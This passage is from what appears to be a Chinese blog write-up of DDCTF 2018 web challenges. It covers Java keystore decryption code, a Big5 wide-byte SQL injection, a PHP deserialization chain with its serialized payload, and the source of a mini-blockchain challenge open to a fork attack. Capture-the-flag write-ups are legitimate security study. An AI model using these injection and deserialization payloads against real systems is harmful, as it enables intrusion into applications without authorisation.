&#123;  </div><div class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> BASE64Decoder()).decodeBuffer(key);  </div><div class="line">    &#125;  </div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span></div><div class="line">&#123;</div><div class="line"><span class="keyword">try</span>&#123;</div><div class="line">KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());</div><div class="line">FileInputStream inputStream = <span class="keyword">new</span> FileInputStream(<span class="string">"C:\\Users\\Administrator\\Desktop\\ddctf\\web2\\key\\sdl.ks"</span>);</div><div class="line">keyStore.load(inputStream, <span class="string">"sdl welcome you !"</span>.substring(<span class="number">0</span>, <span class="string">"sdl welcome you !"</span>.length() - <span class="number">1</span>).trim().replace(<span class="string">" "</span>, <span class="string">""</span>).toCharArray());</div><div class="line"></div><div class="line">PublicKey key = keyStore.getCertificate(<span class="string">"www.didichuxing.com"</span>).getPublicKey();  </div><div class="line">System.out.println(key);</div><div class="line">Cipher cipher = Cipher.getInstance(key.getAlgorithm());</div><div class="line">cipher.init(<span class="number">2</span>, key); </div><div class="line"></div><div class="line"><span class="keyword">byte</span>[] text = decryptBASE64(<span class="string">"S1EgULNQ7TlSYnuzagfIe5gfmjYWZRJE7YBSKoaOGmYZ6yjkmbapuNDyQDiUyjV2mKDGm2hnhkgwA6l0qsdvD9uSOjStWMHHYerOZGvk8epWSQ8YYn2pWArUlV7m2e4nV6oqKYYXRMJVO8776JX00OY/MmUeaj6XoAHk4cWar3BpwAfLw3hsUYDM1NoVjBkPy/SS/DHDhf9YsM+3kF3hNmyUc7tqTvvb/1gzovigpmoAIzc8FDxeaBprG+084bkoIiMlBs8cUyUyZq4x7PD6jvVkb00kHUeVERPFIVxlbS1ph4jS+Wy6yd3GNaYe0wUUwoxd/5MiSG4Z4l4miFX8SQ=="</span>);</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">byte</span>[] doFinal = cipher.doFinal(text); </div><div class="line"></div><div class="line"></div><div class="line">System.out.println(byte2hex(doFinal));</div><div class="line">&#125;</div><div class="line"><span class="keyword">catch</span>(Exception e)</div><div class="line">&#123;</div><div class="line">System.out.println(<span class="string">"e:"</span>+e);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">byte2hex</span><span class="params">(<span class="keyword">byte</span>[] b)</span></span></div><div class="line">  &#123;</div><div class="line">    StringBuilder hs = <span class="keyword">new</span> StringBuilder();</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> n = <span class="number">0</span>; (b != <span class="keyword">null</span>) &amp;&amp; (n &lt; b.length); n++)</div><div class="line">    &#123;</div><div class="line">      String stmp = Integer.toHexString(b[n] &amp; <span class="number">0xFF</span>);</div><div class="line">      <span class="keyword">if</span> (stmp.length() == <span class="number">1</span>) &#123;</div><div class="line">        hs.append(<span class="string">'0'</span>);</div><div class="line">      &#125;</div><div class="line">      hs.append(stmp);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> hs.toString().toUpperCase();</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>一开始以为是宽字节注入，试了很多方式都没试出来，突然看到了提示，如图，链接过去是一篇关于big编码说明的文件。。。</p><img src="/2018/04/19/ddctf-2018/8.png" alt="8.png" title=""><p>那思路很明确了，找一个big编码的字，第二位字节为 <code>0x5c</code> 即 <code>\</code> 转义掉gpc生成的 <code>\</code> 最后成功逃逸单引号 <code>\\&#39;</code></p><img src="/2018/04/19/ddctf-2018/9.png" alt="9.png" title=""><p>接下来就是常规注入了，注入完毕后发现，并没有flag。。。只有一个备份文件。。。算了，下载下来备份文件代码审计吧。</p><img src="/2018/04/19/ddctf-2018/10.png" alt="10.png" title=""><p>发现竟然有个<code>api</code> 接受一个字符串并反序列，直接就get到了考点，<strong>构造反序列化执行链，获取flag</strong></p><img src="/2018/04/19/ddctf-2018/11.png" alt="11.png" title=""><p>这个反序列执行链很简单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">public</span> $sql;</div><div class="line"></div><div class="line">    <span class="comment">//</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;sql=<span class="keyword">new</span> SQL();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQL</span></span></div><div class="line">&#123;</div><div class="line">    </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">FlagGet</span><span class="params">($user)</span></span></div><div class="line">    &#123;</div><div class="line">      <span class="keyword">return</span> <span class="string">""</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> $user_uuid;</div><div class="line">    <span class="keyword">public</span> $fl;</div><div class="line"></div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">$t =  <span class="keyword">new</span> Test();</div><div class="line">$t-&gt;fl = <span class="keyword">new</span> Flag();</div><div class="line">$t-&gt;user_uuid = <span class="string">"c09764a2-8d31-4643-907a-5d663b9348dc"</span>;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> serialize($t);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>生成 <code>O:4:&quot;Test&quot;:2:{s:9:&quot;user_uuid&quot;;s:36:&quot;c09764a2-8d31-4643-907a-5d663b9348dc&quot;;s:2:&quot;fl&quot;;O:4:&quot;Flag&quot;:1:{s:3:&quot;sql&quot;;O:3:&quot;SQL&quot;:0:{}}}</code> 不过要把类名称改成<code>&quot;Index\Helper\Flag&quot;, &quot;Index\Helper\SQL&quot;,&quot;Index\Helper\Test&quot;</code>这种形式才能在远程环境执行。<br>最后的payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:17:&quot;Index\Helper\Test&quot;:2:&#123;s:9:&quot;user_uuid&quot;;s:36:&quot;c09764a2-8d31-4643-907a-5d663b9348dc&quot;;s:2:&quot;fl&quot;;O:17:&quot;Index\Helper\Flag&quot;:1:&#123;s:3:&quot;sql&quot;;O:16:&quot;Index\Helper\SQL&quot;:0:&#123;&#125;&#125;&#125;</div></pre></td></tr></table></figure><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>有关于区块链的代码审计，也是第一次接触到区块链的具体原理，分析了一天，收获蛮大的，这边其实可以利用<strong>区块链分叉攻击</strong>来实现bank未被hack掉的区块链链路（只要这个链路比被hack掉的链路长就可以了。）</p><p>mini区块链源码如下（对学习区块链还是挺有意思）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></div><div class="line"><span class="comment"># written in python 2.7</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> hashlib, json, rsa, uuid</div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, url_for, escape, request</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">app = Flask(__name__)</div><div class="line">app.secret_key = <span class="string">'*********************'</span></div><div class="line">url_prefix = <span class="string">'/b9744af30897e'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'Here is your flag: DDCTF&#123;******************&#125;'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">(x)</span>:</span></div><div class="line">    <span class="keyword">return</span> hashlib.sha256(hashlib.md5(x).digest()).hexdigest()</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_reducer</span><span class="params">(x, y)</span>:</span></div><div class="line">    <span class="keyword">return</span> hash(hash(x)+hash(y))</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">has_attrs</span><span class="params">(d, attrs)</span>:</span></div><div class="line">    <span class="keyword">if</span> type(d) != type(&#123;&#125;): <span class="keyword">raise</span> Exception(<span class="string">"Input should be a dict/JSON"</span>)</div><div class="line">    <span class="keyword">for</span> attr <span class="keyword">in</span> attrs:</div><div class="line">        <span class="keyword">if</span> attr <span class="keyword">not</span> <span class="keyword">in</span> d:</div><div class="line">            <span class="keyword">raise</span> Exception(<span class="string">"&#123;&#125; should be presented in the input"</span>.format(attr))</div><div class="line"></div><div class="line">EMPTY_HASH = <span class="string">'0'</span>*<span class="number">64</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">addr_to_pubkey</span><span class="params">(address)</span>:</span></div><div class="line">    <span class="keyword">return</span> rsa.PublicKey(int(address, <span class="number">16</span>), <span class="number">65537</span>)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pubkey_to_address</span><span class="params">(pubkey)</span>:</span></div><div class="line">    <span class="keyword">assert</span> pubkey.e == <span class="number">65537</span></div><div class="line">    hexed = hex(pubkey.n)</div><div class="line">    <span class="keyword">if</span> hexed.endswith(<span class="string">'L'</span>): hexed = hexed[:<span class="number">-1</span>]</div><div class="line">    <span class="keyword">if</span> hexed.startswith(<span class="string">'0x'</span>): hexed = hexed[<span class="number">2</span>:]</div><div class="line">    <span class="keyword">return</span> hexed</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_addr_key_pair</span><span class="params">()</span>:</span></div><div class="line">    pubkey, privkey = rsa.newkeys(<span class="number">384</span>)</div><div class="line">    <span class="keyword">return</span> pubkey_to_address(pubkey), privkey</div><div class="line"></div><div class="line">bank_address, bank_privkey = gen_addr_key_pair()</div><div class="line">hacker_address, hacker_privkey = gen_addr_key_pair()</div><div class="line">shop_address, shop_privkey = gen_addr_key_pair()</div><div class="line">shop_wallet_address, shop_wallet_privkey = gen_addr_key_pair()</div><div class="line"></div><div class="line">my_address, my_privkey = gen_addr_key_pair()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign_input_utxo</span><span class="params">(input_utxo_id, privkey)</span>:</span></div><div class="line">    <span class="keyword">return</span> rsa.sign(input_utxo_id, privkey, <span class="string">'SHA-1'</span>).encode(<span class="string">'hex'</span>)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_utxo</span><span class="params">(utxo)</span>:</span></div><div class="line">    <span class="keyword">return</span> reduce(hash_reducer, [utxo[<span class="string">'id'</span>], utxo[<span class="string">'addr'</span>], str(utxo[<span class="string">'amount'</span>])])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_output_utxo</span><span class="params">(addr_to, amount)</span>:</span></div><div class="line">    utxo = &#123;<span class="string">'id'</span>: str(uuid.uuid4()), <span class="string">'addr'</span>: addr_to, <span class="string">'amount'</span>: amount&#125;</div><div class="line">    utxo[<span class="string">'hash'</span>] = hash_utxo(utxo)</div><div class="line">    <span class="keyword">return</span> utxo</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_tx</span><span class="params">(tx)</span>:</span></div><div class="line">    <span class="keyword">return</span> reduce(hash_reducer, [</div><div class="line">        reduce(hash_reducer, tx[<span class="string">'input'</span>], EMPTY_HASH),</div><div class="line">        reduce(hash_reducer, [utxo[<span class="string">'hash'</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]], EMPTY_HASH)</div><div class="line">    ])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx</span><span class="params">(input_utxo_ids, output_utxo, privkey_from=None)</span>:</span></div><div class="line">    tx = &#123;<span class="string">'input'</span>: input_utxo_ids, <span class="string">'signature'</span>: [sign_input_utxo(id, privkey_from) <span class="keyword">for</span> id <span class="keyword">in</span> input_utxo_ids], <span class="string">'output'</span>: output_utxo&#125;</div><div class="line">    tx[<span class="string">'hash'</span>] = hash_tx(tx)</div><div class="line">    <span class="keyword">return</span> tx</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_block</span><span class="params">(block)</span>:</span></div><div class="line">    <span class="keyword">return</span> reduce(hash_reducer, [block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>], reduce(hash_reducer, [tx[<span class="string">'hash'</span>] <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]], EMPTY_HASH)])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_block</span><span class="params">(prev_block_hash, nonce_str, transactions)</span>:</span></div><div class="line">    <span class="keyword">if</span> type(prev_block_hash) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">'prev_block_hash should be hex-encoded hash value'</span>)</div><div class="line">    nonce = str(nonce_str)</div><div class="line">    <span class="keyword">if</span> len(nonce) &gt; <span class="number">128</span>: <span class="keyword">raise</span> Exception(<span class="string">'the nonce is too long'</span>)</div><div class="line">    block = &#123;<span class="string">'prev'</span>: prev_block_hash, <span class="string">'nonce'</span>: nonce, <span class="string">'transactions'</span>: transactions&#125;</div><div class="line">    block[<span class="string">'hash'</span>] = hash_block(block)</div><div class="line">    <span class="keyword">return</span> block</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_blockchain_tail</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> max(session[<span class="string">'blocks'</span>].values(), key=<span class="keyword">lambda</span> block: block[<span class="string">'height'</span>])</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_utxo</span><span class="params">(blockchain_tail)</span>:</span></div><div class="line">    curr_block = blockchain_tail</div><div class="line">    blockchain = [curr_block]</div><div class="line">    <span class="keyword">while</span> curr_block[<span class="string">'hash'</span>] != session[<span class="string">'genesis_block_hash'</span>]:</div><div class="line">        curr_block = session[<span class="string">'blocks'</span>][curr_block[<span class="string">'prev'</span>]]</div><div class="line">        blockchain.append(curr_block)</div><div class="line">    blockchain = blockchain[::<span class="number">-1</span>]</div><div class="line">    utxos = &#123;&#125;</div><div class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blockchain:</div><div class="line">        <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]:</div><div class="line">            <span class="keyword">for</span> input_utxo_id <span class="keyword">in</span> tx[<span class="string">'input'</span>]:</div><div class="line">                <span class="keyword">del</span> utxos[input_utxo_id]</div><div class="line">            <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]:</div><div class="line">                utxos[utxo[<span class="string">'id'</span>]] = utxo</div><div class="line">    <span class="keyword">return</span> utxos</div><div class="line">        </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_balance</span><span class="params">(utxos)</span>:</span></div><div class="line">    balance = &#123;bank_address: <span class="number">0</span>, hacker_address: <span class="number">0</span>, shop_address: <span class="number">0</span>&#125;</div><div class="line">    <span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</div><div class="line">        <span class="keyword">if</span> utxo[<span class="string">'addr'</span>] <span class="keyword">not</span> <span class="keyword">in</span> balance:</div><div class="line">            balance[utxo[<span class="string">'addr'</span>]] = <span class="number">0</span></div><div class="line">        balance[utxo[<span class="string">'addr'</span>]] += utxo[<span class="string">'amount'</span>]</div><div class="line">    <span class="keyword">return</span> balance</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_utxo_signature</span><span class="params">(address, utxo_id, signature)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">return</span> rsa.verify(utxo_id, signature.decode(<span class="string">'hex'</span>), addr_to_pubkey(address))</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">append_block</span><span class="params">(block, difficulty=int<span class="params">(<span class="string">'f'</span>*<span class="number">64</span>, <span class="number">16</span>)</span>)</span>:</span></div><div class="line">    has_attrs(block, [<span class="string">'prev'</span>, <span class="string">'nonce'</span>, <span class="string">'transactions'</span>])</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> type(block[<span class="string">'prev'</span>]) == type(<span class="string">u''</span>): block[<span class="string">'prev'</span>] = str(block[<span class="string">'prev'</span>])</div><div class="line">    <span class="keyword">if</span> type(block[<span class="string">'nonce'</span>]) == type(<span class="string">u''</span>): block[<span class="string">'nonce'</span>] = str(block[<span class="string">'nonce'</span>])</div><div class="line">    <span class="comment"># print session['blocks']</span></div><div class="line">    <span class="comment"># print ['prev']</span></div><div class="line">    <span class="keyword">if</span> block[<span class="string">'prev'</span>] <span class="keyword">not</span> <span class="keyword">in</span> session[<span class="string">'blocks'</span>]: <span class="keyword">raise</span> Exception(<span class="string">"unknown parent block"</span>)</div><div class="line">    tail = session[<span class="string">'blocks'</span>][block[<span class="string">'prev'</span>]]</div><div class="line">    utxos = calculate_utxo(tail)</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> type(block[<span class="string">'transactions'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">'Please put a transaction array in the block'</span>)</div><div class="line">    new_utxo_ids = set()</div><div class="line">    <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]:</div><div class="line">        has_attrs(tx, [<span class="string">'input'</span>, <span class="string">'output'</span>, <span class="string">'signature'</span>])</div><div class="line">        </div><div class="line">        <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]:</div><div class="line">            has_attrs(utxo, [<span class="string">'amount'</span>, <span class="string">'addr'</span>, <span class="string">'id'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'id'</span>]) == type(<span class="string">u''</span>): utxo[<span class="string">'id'</span>] = str(utxo[<span class="string">'id'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'addr'</span>]) == type(<span class="string">u''</span>): utxo[<span class="string">'addr'</span>] = str(utxo[<span class="string">'addr'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'id'</span>]) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of id of output utxo"</span>)</div><div class="line">            <span class="keyword">if</span> utxo[<span class="string">'id'</span>] <span class="keyword">in</span> new_utxo_ids: <span class="keyword">raise</span> Exception(<span class="string">"output utxo of same id(&#123;&#125;) already exists."</span>.format(utxo[<span class="string">'id'</span>]))</div><div class="line">            new_utxo_ids.add(utxo[<span class="string">'id'</span>])</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'amount'</span>]) != type(<span class="number">1</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of amount of output utxo"</span>)</div><div class="line">            <span class="keyword">if</span> utxo[<span class="string">'amount'</span>] &lt;= <span class="number">0</span>: <span class="keyword">raise</span> Exception(<span class="string">"invalid amount of output utxo"</span>)</div><div class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'addr'</span>]) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of address of output utxo"</span>)</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                addr_to_pubkey(utxo[<span class="string">'addr'</span>])</div><div class="line">            <span class="keyword">except</span>:</div><div class="line">                <span class="keyword">raise</span> Exception(<span class="string">"invalid type of address(&#123;&#125;)"</span>.format(utxo[<span class="string">'addr'</span>]))</div><div class="line">            utxo[<span class="string">'hash'</span>] = hash_utxo(utxo)</div><div class="line">        tot_output = sum([utxo[<span class="string">'amount'</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]])</div><div class="line">        </div><div class="line">        <span class="keyword">if</span> type(tx[<span class="string">'input'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">"type of input utxo ids in tx should be array"</span>)</div><div class="line">        <span class="keyword">if</span> type(tx[<span class="string">'signature'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">"type of input utxo signatures in tx should be array"</span>)</div><div class="line">        <span class="keyword">if</span> len(tx[<span class="string">'input'</span>]) != len(tx[<span class="string">'signature'</span>]): <span class="keyword">raise</span> Exception(<span class="string">"lengths of arrays of ids and signatures of input utxos should be the same"</span>)</div><div class="line">        tot_input = <span class="number">0</span></div><div class="line">        tx[<span class="string">'input'</span>] = [str(i) <span class="keyword">if</span> type(i) == type(<span class="string">u''</span>) <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> tx[<span class="string">'input'</span>]]</div><div class="line">        tx[<span class="string">'signature'</span>] = [str(i) <span class="keyword">if</span> type(i) == type(<span class="string">u''</span>) <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> tx[<span class="string">'signature'</span>]]</div><div class="line">        <span class="keyword">for</span> utxo_id, signature <span class="keyword">in</span> zip(tx[<span class="string">'input'</span>], tx[<span class="string">'signature'</span>]):</div><div class="line">            <span class="keyword">if</span> type(utxo_id) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of id of input utxo"</span>)</div><div class="line">            <span class="keyword">print</span> utxos</div><div class="line">            <span class="keyword">if</span> utxo_id <span class="keyword">not</span> <span class="keyword">in</span> utxos: <span class="keyword">raise</span> Exception(<span class="string">"invalid id of input utxo. Input utxo(&#123;&#125;) does not exist or it has been consumed."</span>.format(utxo_id))</div><div class="line">            utxo = utxos[utxo_id]</div><div class="line">            <span class="keyword">if</span> type(signature) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of signature of input utxo"</span>)</div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> verify_utxo_signature(utxo[<span class="string">'addr'</span>], utxo_id, signature):</div><div class="line">                <span class="keyword">raise</span> Exception(<span class="string">"Signature of input utxo is not valid. You are not the owner of this input utxo(&#123;&#125;)!"</span>.format(utxo_id))</div><div class="line">            tot_input += utxo[<span class="string">'amount'</span>]</div><div class="line">            <span class="keyword">del</span> utxos[utxo_id]</div><div class="line">        <span class="keyword">if</span> tot_output &gt; tot_input:</div><div class="line">            <span class="keyword">raise</span> Exception(<span class="string">"You don't have enough amount of DDCoins in the input utxo! &#123;&#125;/&#123;&#125;"</span>.format(tot_input, tot_output))</div><div class="line">        tx[<span 